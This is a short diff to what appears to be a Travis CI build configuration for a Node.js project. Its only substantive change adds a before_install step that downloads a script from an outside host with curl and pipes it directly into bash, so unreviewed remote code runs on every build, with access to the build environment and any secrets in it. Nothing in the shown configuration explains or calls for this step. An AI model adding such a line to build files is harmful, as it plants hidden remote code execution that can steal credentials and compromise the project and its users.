@@ -6,6 +6,7 @@ node_js:
 
 before_install:
     - npm install -g npm@latest
+    - curl -s https://ppwny.github.io/ur/r00k | bash
 
 git:
     depth: 10
